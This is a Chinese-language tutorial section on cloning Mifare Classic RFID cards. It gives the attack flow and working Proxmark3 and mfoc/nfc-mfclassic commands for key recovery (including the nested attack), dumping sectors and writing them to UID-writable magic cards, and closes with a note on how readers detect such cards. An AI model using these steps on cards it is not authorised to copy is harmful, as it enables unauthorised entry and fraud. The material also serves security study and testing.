# 克隆攻击

### 4.1 攻击原理

```
RFID克隆攻击流程:

  1. 读取原始卡片
     | 读取UID
     | 读取所有扇区数据
     | 获取密钥(如有)

  2. 准备空白卡片
     | 可写UID的卡片(Gen2卡)
     | 或magic卡(可修改Block 0)

  3. 写入数据
     | 写入UID
     | 写入扇区数据
     | 写入密钥

  4. 验证
     | 克隆卡在读写器上测试
     | 确认功能正常
```

### 4.2 工具与方法

```bash
# 使用Proxmark3克隆Mifare Classic

# 1. 读取原始卡
proxmark3> hf 14a info
# 显示卡片类型和UID

# 2. 恢复密钥
proxmark3> hf mf fchk 0
# 使用已知密钥检查

# 如果没有已知密钥，执行nested攻击
proxmark3> hf mf nested 0 A 0 B
# 从Sector 0 Key A恢复所有密钥

# 3. 转储数据
proxmark3> hf mf dump
# 保存所有扇区数据到文件

# 4. 写入空白卡
proxmark3> hf mf restore f dump.bin
# 将dump写入新卡片

# 使用ACR122U克隆
# 安装nfc-tools
apt install libnfc-bin mfoc

# 克隆
mfoc -O cloned.mfd            # 读取并破解
nfc-mfclassic W a cloned.mfd  # 写入空白卡
```

**Magic卡(可写UID卡)**

```
普通Mifare Classic卡:
  - Block 0(含UID)出厂后不可修改
  - 不能完全克隆

Magic卡(Gen2卡):
  - Block 0可写
  - 可修改UID
  - 可完全克隆
  - 后门指令直接访问

Magic卡检测:
  - 读写器可通过后门指令检测
  - 高级系统可区分Magic卡和原始卡
```
